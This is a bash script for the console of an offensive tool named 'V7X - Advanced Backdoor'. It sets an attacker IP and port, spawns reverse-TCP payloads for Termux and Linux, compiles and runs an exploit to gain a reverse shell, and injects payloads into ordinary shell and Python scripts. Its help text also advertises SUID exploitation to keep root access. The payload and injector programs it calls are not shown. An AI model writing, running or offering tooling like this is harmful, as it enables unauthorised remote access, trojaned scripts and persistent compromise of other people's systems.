#!/bin/bash
python3 anim/login.py
sleep 0.1
black='\033[0;30m'
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[2;93m'
blue='\033[0;34m'
white='\033[0;97m'

Ublack="\033[4;30m"
Ured="\033[4;31m"
Ugreen="\033[4;32m"
Uyellow="\033[4;33m"
Ublue="\033[4;34m"
Upurple="\033[4;35m"
Ucyan="\033[4;36m"
Uwhite="\033[4;37m"

ba_black='\033[40m'
ba_red='\033[1;41m'
ba_blue='\033[1;44m'
ba_green='\033[1;42m'
ba_yellow='\033[1;43m'
ba_white='\033[0;47m'

cls(){
clear
}

full_guide(){
    nano guide/a_usage
    nano guide/payloads.txt
    nano guide/warning.txt
}
rm ason/prepared.w &> /dev/null
export VSET_RUNNED=0
printf "$green[+]$white V7X - Advanced Backdoor: this version support exploiting termux & linux\n"
sleep 0.05
printf "$yellow[P]$white Please Report any Bug\n"
sleep 0.05
printf "$green[+V7X+]$white Starting The VCS interactive console... (version 1.0)\n"
sleep 0.4
target_os=''
target(){
   if [ "$1" == "termux" ];then
        target_os="termux"
        printf "$green[+]$white Using Termux Modules\n"
   elif [ "$1" == "linux" ];then
        target_os="linux"
        printf "$green[+]$white Using Linux Modules\n"
   elif [ "$1" == "windows" ];then
        printf "$red[~]$white Windows Modules Will Be Available in the next update\n"
   elif [ "$1" == "" ];then
        printf "$red[-]$white Please Choose a module\n"
   else
        printf "$red[-]$white Module \'$1\' Not Found\n"
   fi
}


exploit_prog(){
if [ ! -f console/$target_os/exploit ]
then
   printf "$green[+]$white Compiling exploit..."
   gcc console/$target_os/exploit.c -o console/$target_os/exploit
   printf "Done\n"
fi
}
vset(){
   if  [ '$1' == '' ] || [ '$2' == '' ]
   then
       printf "$red[!]$white Error: 'vset' Command Need 2 Argument: IP - Port\n"
   else
       IP=$1
       PORT=$2
       export VSET_RUNNED=1
       printf "$green[+]$white Address Set To: ip: $1 -  port: $2\n"
       touch ason/prepared.w
   fi
}
vcs-spawn(){
   if [ "$1" == "" ];then
     printf "$red[!]$white Error Spawning a Payload: need 1 argument: Name\n"
   elif [ ! -f ason/prepared.w ];then
     printf "$red[!]$white Error Spawning a Payload: Please set IP and PORT using vset\n"
   elif [ "$target_os" == '' ];then
     printf "$red[-]$white Error Spawning a Payload: Please set target os using target\n"
   else
     python3 anim/payload_spawn_an.py
     NAME=$1
     cd console/$target_os
     ./vcs.spawn $IP $PORT $NAME
     mv $NAME ../..
     cd ../..
     printf "$green[+]$white $1 Spawned\n"
   fi
}
vcs-update(){
   printf "$red[-]$white This Version is for testing, Update not supported\n"
}
vcs-remove(){
if [ "$target_os" == '' ];then
   printf "$red[!]$white Please set target os before removing virus\n"
else
   console/$target_os/vcs.clean
fi
}
vcs-exploit(){
  if [ "$target_os" == '' ];then
    printf "$red[-]$white Please Set Target os Before starting exploit\n"
  else
   exploit_prog
   console/$target_os/exploit $IP $PORT
  fi
}
vexit(){
 exit
}
ish(){
if [ "$1" == '' ] || [ "$2" == '' ] || [ "$3" == '' ];then
  printf "$red[-]$white There Are A Missing Argument: 1: <payload.sh> 2: <normal_file.sh> 3: <result.sh>\n"
elif [ ! -f "$1" ] | [ ! -f "$2" ];then
  printf "$red[-]$white Target File or Payload Does not exist\n"
else
  printf "$yellow[L]$white Injecting Payload to $2 Data..."
  sleep 0.6
  printf "Done\n"
  sleep 0.1
  printf "$yellow[L]$white Storing Data in $3...\n"
  sleep 0.1
  scripts/shinjector $1 $2 $3
  python3 anim/pinsh.py
fi
}
ipy(){
if [ "$1" == '' ] || [ "$2" == '' ] || [ "$3" == '' ];then
  printf "$red[-]$white There Are A Missing Argument: 1: <payload.sh> 2: <normal_file.sh> 3: <result.sh>\n"
elif [ ! -f "$1" ] || [ ! -f "$2" ];then
  printf "$red[-]$white Target File or Payload Does not exist\n"
else
  printf "$yellow[L]$white Injecting Payload to $2 Data..."
  sleep 0.6
  printf "Done\n"
  sleep 0.1
  printf "$yellow[L]$white Storing Data in $3...\n"
  sleep 0.1
  scripts/pyinjector $1 $2 $3
  python3 anim/pinpy.py
fi
}
help(){
  if [ ! -f scripts/alert  ];then
    gcc scripts/alert.c -o scripts/alert
  fi
  scripts/alert
  printf "    VCS Tool (By V7X Team) Is For Creating Payloads And Exploiting System\n"
  printf "and Gaining access to it with Advanced Reverse Shell.\n"
  printf "=============================================================\n"
  printf "    Support SUID Exploitation To Maintain root access to the system.\n"
  printf "\n\n"
  printf "Commands: \n"
  printf "$yellow          vset       : $white set attacker address\n"
  printf "$yellow          vcs-spawn  : $white Spawn a vcs payload (reverse tcp to attacker address)\n"
  printf "$yellow          vcs-remove : $white Remove Virus From The System (VCS virus)\n"
  printf "$yellow          vcs-exploit: $white Exploit payload and Gain Access via reverse shell\n"
  printf "$yellow          target     : $white select target OS\n"
  printf "$yellow          cls        : $white clear screen\n"
  printf "$yellow          ish        : $white Inject payload in shell script\n"
  printf "$yellow          ipy        : $white Inject payload in python script\n"
  printf "$yellow          full_guide : $white Read the tool guide\n"
  printf "$yellow          exit       : $white exit\n"
  printf "                                \n"
}

while [ 1 ];do
 sleep 0.04
 printf "$green[+]$green ($yellow/VCS$green)$red->$white "
 read vcmd

 sleep 0.04
 if [ -f /bin/$(echo $vcmd | head -n1 | awk '{print $1;}') ];then
    printf "$red[-]$white Bash Command blocked inside VCS\n"
 elif [ '$vcmd' == '' ];then
    printf ''; break;
 elif [ -f data/$(echo $vcmd | head -n1 | awk '{print $1;}') ];then
    $vcmd
 elif [ "$vcmd" == '' ];then
    printf '\n'
 else
    printf "$red[-]$white Command Not Found: $(echo $vcmd | head -n1 | awk '{print $1;}')\n"

 fi
done
